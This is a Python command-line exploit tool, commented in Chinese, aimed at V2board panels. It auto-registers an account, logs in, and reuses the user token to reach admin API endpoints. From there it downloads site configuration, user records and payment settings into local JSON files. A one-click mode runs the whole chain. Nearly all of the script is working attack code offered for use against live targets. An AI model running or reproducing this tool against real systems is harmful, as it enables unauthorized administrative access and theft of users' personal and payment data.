import os
from urllib.parse import urlparse
import click
import requests
import random
import string


headers = {
    "authorization": "qqw",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
}


def check_version(target):
    """
       验证版本是否存在漏洞
    """
    path = "/api/v1/admin/config/fetch"
    url = (target + path).replace('//api', '/api')
    resp = session.get(url=url, headers=headers)
    message = r"\u9274\u6743\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u767b\u5165"
    # message = s.replace('\\', '\\\\')
    # print(message)
    # print(resp.text)
    if message in resp.text:
        print(f"[*]{target}存在漏洞[*]")
    else:
        print(f"[*]{target}不存在漏洞[*]")


def check_verify(target):
    """
    检查注册是否需要邀请码或者邮箱验证
    这里只考虑
    is_email_verify: 0
    is_invite_force: 0
    的情况
    """
    path = "/api/v1/guest/comm/config"
    url = (target + path).replace('//api', '/api')
    resp = session.get(url=url, headers=headers)
    data = resp.json()['data']
    # print(data)
    if data['is_email_verify'] == 0 and data['is_invite_force'] == 0:
        print("[*]无需验证[*]")
    elif data['is_email_verify'] == 1 and data['is_invite_force'] == 0:
        print("[*]需要邮箱验证[*]")
    elif data['is_email_verify'] == 0 and data['is_invite_force'] == 1:
        print("[*]需要邀请码[*]")
    else:
        print("[*]需要邮箱和邀请码验证[*]")


def register_login(target):
    """
    自动注册账号,并且登录
    """
    reg_path = "/api/v1/passport/auth/register"
    reg_url = (target + reg_path).replace('//api', '/api')
    password = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    email = password + "@163.com"
    reg_data = {
        "email": email,
        "password": password,
        "invite_code": '',
        "email_code": ''
    }
    resp1 = session.post(url=reg_url, data=reg_data, headers=headers)
    if resp1.status_code == 200:
        print("[*]账号注册成功[*]")
        print("[*]账号:" + email + "\n" + "[*]密码:" + password)
        # data = resp1.json()['data']
        # print("[*]token:" + data['token'])
        # print("[*]auth_data:" + data['auth_data'])
    else:
        print("[*]账号注册失败,目标可能关闭注册[*]")

    login_path = "/api/v1/passport/auth/login"
    login_url = (target + login_path).replace('//api', '/api')
    login_data = {
        "email": email,
        "password": password
    }
    resp2 = session.post(url=login_url, data=login_data, headers=headers)
    if resp2.status_code == 200:
        print("[*]账号登录成功[*]")
        data = resp2.json()['data']
        token = data['token']
        print("[*]token:" + token)
        print("[*]auth_data:" + data['auth_data'])
        return data['auth_data']
    else:
        print("[*]账号登录失败[*]")


def pwn(target, auth_data):
    """
    漏洞利用以及获取数据
    """
    # 替换authorization
    headers['authorization'] = auth_data
    path = "/api/v1/user/info"
    url = (target + path).replace('//api', '/api')
    # 登录成功需要请求这个接口authorization才能生效
    session.get(url=url, headers=headers)

    path = "/api/v1/admin/config/fetch"
    # 接口数据路由, 可以自行添加进path_lists
    # https://github.com/v2board/v2board/blob/master/app/Http/Routes/AdminRoute.php
    path_lists = ['/config/fetch', '/user/fetch', '/payment/fetch']
    url = (target + path).replace('//api', '/api')
    resp = session.get(url=url, headers=headers)
    if resp.status_code == 200:
        print("[*]成功获取管理员权限[*]")
        base = "/api/v1/admin"
        # 用户数据
        # path = "/user/fetch"
        # url = (target + base + path).replace('//api', '/api')
        # print(url)
        # resp = session.get(url=url, headers=headers)
        for path in path_lists:
            url = (target + base + path).replace('//api', '/api')
            resp = session.get(url=url, headers=headers)
            if resp.status_code == 200:
                with open((path + '.json').replace('/', '_'), 'w') as f:
                    f.write(resp.text)
                print(f"[*]获取{path}接口数据成功[*]")
            else:
                print(f"[*]获取{path}接口数据失败[*]")
                exit(0)
    else:
        print("[*]获取管理员权限失败[*]")
        exit(0)


def cre_url_dir(url_dir):
    if not os.path.exists(url_dir):
        os.mkdir(url_dir)
    os.chdir(url_dir)


def run_exp(target):
    """一键获取管理员权限以及各个接口数据"""
    url_dir = urlparse(target).netloc
    cre_url_dir(url_dir)
    check_version(target=target)
    check_verify(target)
    auth_data = register_login(target)
    pwn(target=target, auth_data=auth_data)


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])


@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-c', '--check', is_flag=True, help='验证版本是否存在漏洞')
@click.option('-r', '--run', is_flag=True, help='一键获取管理员权限以及各个接口数据')
@click.argument('target')
def main(check, run, target):
    """
    V2board越权漏洞利用工具
    """
    if check:
        check_version(target=target)
        exit(0)
    if run:
        run_exp(target=target)
        exit(0)


if __name__ == '__main__':
    session = requests.session()
    main()


